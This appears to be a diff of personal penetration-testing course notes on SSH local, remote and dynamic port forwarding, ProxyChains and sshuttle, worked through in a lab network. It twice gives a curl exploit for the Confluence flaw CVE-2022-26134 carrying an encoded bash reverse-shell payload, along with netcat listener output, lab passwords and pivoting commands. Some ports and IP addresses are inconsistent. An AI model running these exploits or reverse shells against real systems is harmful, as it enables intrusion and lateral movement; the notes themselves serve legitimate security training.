+&lt;li&gt;We also pass the &lt;code&gt;-N&lt;/code&gt; flag preventing a shell from spawning.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;# Kali
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ curl http://192.168.249.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Kali Netcat listener to CONFLUENCE01
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.249.63] 42070
+bash: cannot set terminal process group (2206): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;  
+&amp;lt;/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;   
+$ id
+id
+uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
+
+$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.249.215
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.249.215
+Could not create directory &amp;#39;/home/confluence/.ssh&amp;#39;.
+The authenticity of host &amp;#39;10.4.249.215 (10.4.249.215)&amp;#39; can&amp;#39;t be established.
+ECDSA key fingerprint is SHA256:GMUxFQSTWYtQRwUc9UvG2+8toeDPtRv3sjPyMfmrOH4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+database_admin@10.4.249.215&amp;#39;s password: sqlpass123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;As before, if we wanted to manually confirm that port 9999 is listening on CONFLUENCE01, we would exploit the Confluence vulnerability again to get another reverse shell (since our existing shell is tied up with the SSH port forward command), then run ss in that shell.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;As we did earlier, we will conn to port 445 on HRSHARES, but this time through the SOCKS proxy port created by our SSH dynamic port forward command.&lt;/p&gt;
+&lt;p&gt;We will want to use &lt;code&gt;smbclient&lt;/code&gt; again, but it doesn&amp;#39;t have a native option to use a SOCKS proxy.  In these situations we will use &lt;a href=&quot;https://github.com/rofl0r/proxychains-ng&quot;&gt;ProxyChains&lt;/a&gt;.  ProxyChains is a tool that can force network traffic over HTTP or SOCKS proxies, it can also push traffic through a &lt;em&gt;chain&lt;/em&gt; of concurrent proxies as the name suggests.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;The way Proxychains works is a light hack. It uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most dynamically-linked binaries that perform simple network operations. It won&amp;#39;t work on statically-linked binaries.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;ProxyChains uses a config file for almost everything, located by default at &lt;code&gt;/etc/proxychains4.conf&lt;/code&gt;.  We edit this file to ensure that proxychains can locate the SOCKS proxy.  Proxies are at the end of the file, we can replace any existing proxy definition with a single line defining proxy type, IP address, and port of the SOCKS proxy on CONFLUENCE01.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;socks5 192.168.249.63 9999
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;Although we specify socks5 in this example, it could also be socks4, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;After edit our conf will look like:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ tail /etc/proxychains.conf 
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: &amp;quot;basic&amp;quot;-http  &amp;quot;user/pass&amp;quot;-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &amp;quot;tor&amp;quot;
+#socks4 	127.0.0.1 9050
+
+socks5 192.168.249.63 9999
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can now use ProxyChains to list the available shares on HRSHARES using smbclient on our Kali machine.  Instead of conn to a port of CONFLUENCE01 we will write our command as if smbclient is conn directly to PGDATABASE01.  We simply prepend &lt;code&gt;proxychains&lt;/code&gt; to the command, reading the conf, and forcing traffic through our SOCKS proxy.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ proxychains smbclient -L //172.16.249.217/ -U hr_admin --password=Welcome1234
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:445  ...  OK
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    Scripts         Disk      
+    Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:139  ...  OK
+[proxychains] Strict chain  ...  192.168.249.63:9999  ...  172.16.249.217:139  ...  OK
+do_connect: Connection to 172.16.249.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The conn succeeded and we managed to list shares on HRSHARES, including the interesting &lt;code&gt;scripts&lt;/code&gt; folder.  We see some addt output from proxychains including the ports interacted with while the proc was running.&lt;/p&gt;
+&lt;p&gt;We can escalate and port scan HRSHARES through our proxy using Nnamp.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use TCP-connect scan &lt;code&gt;-sT&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Skip DNS resolution &lt;code&gt;-n&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Skiip host discovery &lt;code&gt;-Pn&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Check top 20 ports &lt;code&gt;--top-ports=20&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Increase verbosity &lt;code&gt;-vvv&lt;/code&gt;
+We once again prepend with &lt;code&gt;proxychains&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 17:26 EDT
+Initiating Parallel DNS resolution of 1 host. at 17:26
+Completed Parallel DNS resolution of 1 host. at 17:26, 0.09s elapsed
+DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 17:26
+Scanning 172.16.50.217 [20 ports]
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:111 &amp;lt;--socket error or timeout!
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:22 &amp;lt;--socket error or timeout!
+...
+[proxychains] Strict chain  ...  192.168.50.63:9999  ...  172.16.50.217:5900 &amp;lt;--socket error or timeout!
+Completed Connect Scan at 17:30, 244.33s elapsed (20 total ports)
+Nmap scan report for 172.16.50.217
+Host is up, received user-set (9.0s latency).
+Scanned at 2022-08-20 17:26:47 EDT for 244s
+
+PORT     STATE  SERVICE       REASON
+21/tcp   closed ftp           conn-refused
+22/tcp   closed ssh           conn-refused
+23/tcp   closed telnet        conn-refused
+25/tcp   closed smtp          conn-refused
+53/tcp   closed domain        conn-refused
+80/tcp   closed http          conn-refused
+110/tcp  closed pop3          conn-refused
+111/tcp  closed rpcbind       conn-refused
+135/tcp  open   msrpc         syn-ack
+139/tcp  open   netbios-ssn   syn-ack
+143/tcp  closed imap          conn-refused
+443/tcp  closed https         conn-refused
+445/tcp  open   microsoft-ds  syn-ack
+993/tcp  closed imaps         conn-refused
+995/tcp  closed pop3s         conn-refused
+1723/tcp closed pptp          conn-refused
+3306/tcp closed mysql         conn-refused
+3389/tcp open   ms-wbt-server syn-ack
+5900/tcp closed vnc           conn-refused
+8080/tcp closed http-proxy    conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 244.62 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The scan succeeds, proxychains gives us insight into each socket attempted, if the conn failed, and how.  Nmap found TCP ports 135, 139, 445, and 3389 are open.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Speed up port scanning with ProxyChains&lt;/strong&gt;
+&lt;em&gt;By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;We have successfully create a dynamic port forward and used proxychains to push traffic from both smbclient and Nmap through SOCKS proxy port that we created, allowing us to list shares and port scan HRSHARES.&lt;/p&gt;
+&lt;h5&gt;SSH Remote Port Forwarding&lt;/h5&gt;
+&lt;p&gt;Thus far we&amp;#39;ve been able to conn to any port we bind on CONFLUENCE01 WAN iface.  IRL, more often than not, hardware/software firewalls will get in the way.  Inbound traffic is typically under tighter control than outbound traffic.  Only in rare cases do we compromise creds of SSH users, allowing us a direct connection into a network and port forwarding.  We will only be able to bind to a network perimeter in rare cases.&lt;/p&gt;
+&lt;p&gt;More often than not, we will be able to SSH out of a network.  Outbound conns are more difficult to control than inbound conns.  Most corporate networks will allow many types of network traffic out, including SSH, for reasons of simplicity, usability, and business need.  So while it won&amp;#39;t be likely to connect to a port we bind to the network perimeter, it will often be possible to SSH out.&lt;/p&gt;
+&lt;p&gt;This makes SSH &lt;a href=&quot;https://man.openbsd.org/ssh#R&quot;&gt;remote port forwarding&lt;/a&gt; very useful.  In the same way an attacker can exec a rev shell payload to conn back to a listener they control, SSH remote port forwarding can be used to conn back to a SSH server they control, binding to a port there.  Similar to a reverse shell, for port forwarding.&lt;/p&gt;
+&lt;p&gt;In local and dynamic port forwarding, the listener port is bound to the server, in remote port forwarding, the listening port is bound to the client.  Packets are forwarded by the client.&lt;/p&gt;
+&lt;p&gt;Let&amp;#39;s reconsider our lab scenario.  We compromise CONFLUENCE01 using CVE-2022-26134.  In this scenario the admin has improved network security by implementing a firewall at the perimeter.  The firewall is configured so, regardless of what port we bind on the WAN iface, the only port we can connect to from our machine is TCP port 8090.&lt;/p&gt;
+&lt;p&gt;As we did with Socat, we want to enum the PostgreSQL DB running on port 5432 on PGDATABASE01.  CONFLUENCE01 doesn&amp;#39;t have the tools we need and because of the firewall we can&amp;#39;t create a port forward with a listening port on CONFLUENCE01.&lt;/p&gt;
+&lt;p&gt;CONFLUENCE01 does have an SSH client and we can setup an SSH serve on our Kali machine.  We can conn from CONFLUENCE01 to our Kali machine over SSH.  The listening TCP port 2345 is bound to the lo iface on our Kali machine.  Packets send to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01.  They then get forwarded to the PostgresSQL DB port on PGDATABASE01.&lt;/p&gt;
+&lt;p&gt;To set this up in our lab, we first need to enable the SSH server on our Kali machine.
+&lt;em&gt;Before you start the Kali SSH server, make sure you&amp;#39;ve set a strong, unique password for the Kali user!&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
+└─$ sudo systemctl start ssh                   
+[sudo] password for operator:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can check that the port is open using &lt;code&gt;ss&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/…/IR/DevOps/logging/cloudfront]
+└─$ sudo ss -ntplu          
+Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
+udp      UNCONN    0         0                  0.0.0.0:35145            0.0.0.0:*        users:((&amp;quot;openvpn&amp;quot;,pid=533211,fd=3))                                                     
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4017,fd=237))                                                      
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4017,fd=184))                                                      
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4064,fd=81))                                                       
+tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=1578,fd=3))                                                          
+tcp      LISTEN    0         1                127.0.0.1:38184            0.0.0.0:*        users:((&amp;quot;autossh&amp;quot;,pid=531863,fd=3))                                                     
+tcp      LISTEN    0         511              127.0.0.1:6463             0.0.0.0:*        users:((&amp;quot;Discord&amp;quot;,pid=152499,fd=179))                                                   
+tcp      LISTEN    0         10                       *:3389                   *:*        users:((&amp;quot;gnome-remote-de&amp;quot;,pid=2790,fd=15))                                              
+tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:((&amp;quot;sshd&amp;quot;,pid=1578,fd=4)) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The SSH server is listening on port 22 of all ifaces for both IPv4 and IPv6.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Once we have a reverse shell from CONFLUENCE01, we ensure it is a TTY shell, then create the SSH remote port forward back to our Kali machine.
+&lt;em&gt;In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The SSH remote port forward option is &lt;code&gt;-R&lt;/code&gt; with a similar syntax to local port forward.  It takes two socket pairs as the arg.  The listening socket is defined first and the forwarding socket is second.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Listen on port &lt;code&gt;2345&lt;/code&gt; of our Kali machine.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;127.0.0.1:2345&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Foward all traffic to PostgresSQL port of PGDATABASE01	.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;192.168.244.63:5432&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2346:10.4.244.215:5432 operator@192.168.45.182
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.244.63] 34620
+bash: cannot set terminal process group (2761): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;  
+&amp;lt;/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;   
+$  ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2345:10.4.244.215:5432 operator@192.168.45.182
+ssh -o PubKeyAuthentication=no -N -R 127.0.0.1:2345:10.4.244.215:5432 operator@192.168.45.182
+Could not create directory &amp;#39;/home/confluence/.ssh&amp;#39;.
+The authenticity of host &amp;#39;192.168.45.182 (192.168.45.182)&amp;#39; can&amp;#39;t be established.
+ECDSA key fingerprint is SHA256:k/DKrtnHi0S7KxJvsqrW010Y7dvqFQm7BAW1SazR3eo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+yes
+Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+operator@192.168.45.182&amp;#39;s password:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can confirm the remote port forward by checking listening port 2345 is open on our Kali lo iface.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ sudo ss -ntplu                                                     
+Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
+udp      UNCONN    0         0                  0.0.0.0:36624            0.0.0.0:*        users:((&amp;quot;openvpn&amp;quot;,pid=533211,fd=3))                                                     
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4017,fd=237))                                                      
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4017,fd=184))                                                      
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=4064,fd=81))                                                       
+tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=534414,fd=3))                                                        
+tcp      LISTEN    0         1                127.0.0.1:38184            0.0.0.0:*        users:((&amp;quot;autossh&amp;quot;,pid=531863,fd=3))                                                     
+tcp      LISTEN    0         511              127.0.0.1:6463             0.0.0.0:*        users:((&amp;quot;Discord&amp;quot;,pid=152499,fd=179))                                                   
+tcp      LISTEN    0         128              127.0.0.1:2345             0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=534500,fd=7))                                                        
+tcp      LISTEN    0         10                       *:3389                   *:*        users:((&amp;quot;gnome-remote-de&amp;quot;,pid=2790,fd=15))                                              
+tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:((&amp;quot;sshd&amp;quot;,pid=534414,fd=4)) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can now start probing port 2345 on our lo iface of our Kali machine as if we were probing the PostresSQL DB port on PGDATABASE01 directly.  On our Kali machine:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Use &lt;code&gt;psql&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Pass &lt;code&gt;127.0.0.1&lt;/code&gt; as host &lt;code&gt;-h&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;2345&lt;/code&gt; as the port &lt;code&gt;-p&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Using the DB creds we found on CONFLUENCE01.
+ - &lt;code&gt;postgres&lt;/code&gt; user &lt;code&gt;-U&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Password &lt;code&gt;D@t4basePassw0rd!&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ psql -h 127.0.0.1 -p 2346 -U postgres
+Password for user postgres: 
+psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type &amp;quot;help&amp;quot; for help.
+
+postgres=# \l
+                                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
+------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ hr_backup  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+(5 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We can now interact with PGDATABASE01 through our remote port forward.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We created an SSH remote port forward to allow us to connect to an internal DB server from our Kali machine, traversing a perimeter firewall, which would otherwise block inbound conns.&lt;/p&gt;
+&lt;h5&gt;SSH Remote Dynamic Port Forwarding&lt;/h5&gt;
+&lt;p&gt;With remote port forwarding we were able to forward packets to a single socket per SSH conn, this is a limiting factor.  As we saw with local port forwards, we can also utilize dynamic port forwarding for remote sessions.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://man.openbsd.org/ssh#R~5&quot;&gt;Remote Dynamic Port Forwarding&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;This creates a dynamic port forward in the remote configuration, with the SOKS proxy port bound to the SSH server, and traffic forwarded from the SSH client.  This allows us to connect to other ports and hosts through the same connections.  We gain the flexibility of dynamic port forwarding and the benefits of the remote configuration.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Remote dynamic port forwarding has only been available since October 2017&amp;#39;s &lt;a href=&quot;https://www.openssh.com/txt/release-7.6&quot;&gt;OpenSSH 7.6&lt;/a&gt;. Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn&amp;#39;t matter.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Extending our scenario, we find a Win server, MULTISERVER03 on the DMZ network.  The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP 8090 on CONFLUENCE01 from our Kali machine.  We can SSH out from CONFLUENCE01 to our Kali machine and create a remote dynamic port forward so we can start enumerating MULTISERVER03	from Kali.&lt;/p&gt;
+&lt;p&gt;The SSH session is initiated from CONFLUENCE01 connecting back to Kali, binding the SOCKS proxy port to our Kali machine on TCP 9998.  Packets sent to that port get pushed through the tunnel and forwarded to anywhere CONFLUENCE01 can route to!&lt;/p&gt;
+&lt;p&gt;The remote dynamic port forward command is simple, although confusingly uses the &lt;code&gt;-R&lt;/code&gt; option as remote port forwarding.  The difference is we only pass one socket, the listening socket for the SSH server.  No need to specify IP, it will bind to lo by default.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+
+ssh -o PubKeyAuthentication=no -N -R 9998 operator@192.168.45.182
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ sudo ss -ntplu
+[sudo] password for operator: 
+Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                               
+
+...
+tcp      LISTEN    0         128              127.0.0.1:9998             0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=538678,fd=9))
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Edit our proxychains conf.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &amp;quot;tor&amp;quot;
+socks5 127.0.0.1 9998
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then run Nmap through proxychains.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ proxychains nmap -vvv -sT --top-ports=20 -Pn 192.168.230.64
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times may be slower.
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:10 PST
+Initiating Parallel DNS resolution of 1 host. at 18:10
+Completed Parallel DNS resolution of 1 host. at 18:10, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 18:10
+Scanning 192.168.230.64 [20 ports]
+...
+Completed Connect Scan at 18:12, 106.64s elapsed (20 total ports)
+Nmap scan report for 192.168.230.64
+Host is up, received user-set (5.3s latency).
+Scanned at 2023-11-09 18:10:22 PST for 107s
+
+PORT     STATE  SERVICE       REASON
+21/tcp   closed ftp           conn-refused
+22/tcp   closed ssh           conn-refused
+23/tcp   closed telnet        conn-refused
+25/tcp   closed smtp          conn-refused
+53/tcp   closed domain        conn-refused
+80/tcp   closed http          conn-refused
+110/tcp  closed pop3          conn-refused
+111/tcp  closed rpcbind       conn-refused
+135/tcp  closed msrpc         conn-refused
+139/tcp  closed netbios-ssn   conn-refused
+143/tcp  closed imap          conn-refused
+443/tcp  closed https         conn-refused
+445/tcp  closed microsoft-ds  conn-refused
+993/tcp  closed imaps         conn-refused
+995/tcp  closed pop3s         conn-refused
+1723/tcp closed pptp          conn-refused
+3306/tcp closed mysql         conn-refused
+3389/tcp closed ms-wbt-server conn-refused
+5900/tcp closed vnc           conn-refused
+8080/tcp closed http-proxy    conn-refused
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 106.73 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We receive our results and find that ports 80, 135, and 3389 are open.
+&lt;em&gt;Scanning is a little slower against this Windows host - likely due to the different way the Windows firewall responds when a port is closed compared to Linux.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Using sshuttle&lt;/h5&gt;
+&lt;p&gt;When we have direct access to an SSH server with a complex internal network behind it, classic dynamic port forwards may be difficult to manage.  &lt;a href=&quot;https://github.com/sshuttle/sshuttle&quot;&gt;sshuttle&lt;/a&gt; turns SSH conns into a VPN like local routing system, forcing traffic through the SSH tunnel.  It does require root privs on the SSH client and Python3 on the SSH server, not the most lightweight option, but useful in the right scenario.&lt;/p&gt;
+&lt;p&gt;In our lab, we have SSH access to PGDATABASE01 which we can access through a port forward set up on CONFLUENCE01.  Let&amp;#39;s observe the capabilities of shuttle.&lt;/p&gt;
+&lt;p&gt;First, we can set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN iface and forwarding to port 22 on PGDATABASE01.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl http://192.168.200.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4445%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+
+socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ nc -nvlp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.200.63] 55138
+bash: cannot set terminal process group (2198): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+&amp;lt;/bin$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;   
+$ socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22
+socat TCP-LISTEN:2222,fork TCP:10.4.200.215:22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we can run &lt;code&gt;sshuttle&lt;/code&gt;, by specifying our SSH con string and the subnets that we want to tunnel through this conn, &lt;code&gt;10.4.50.0/24&lt;/code&gt; and &lt;code&gt;172.16.50.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sshuttle -r database_admin@192.168.200.63:2222 10.4.200.0/24 172.16.200.0/24
+# Added host to ~/.ssh/config as &amp;quot;pgdb&amp;quot;
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ sshuttle -v -r pgdb 10.4.200.0/24 172.16.200.0/24
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;sshuttle doesn&amp;#39;t generate much output, but it should be routing our traffic so that requests made to hosts in the subnets we specified will be pushed transparently through the SSH conn.  Let&amp;#39;s try to conn to the SMB share on HRSHARES in a new terminal.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;smbclient -L //172.16.200.217/ -U hr_admin --password=Welcome1234
+
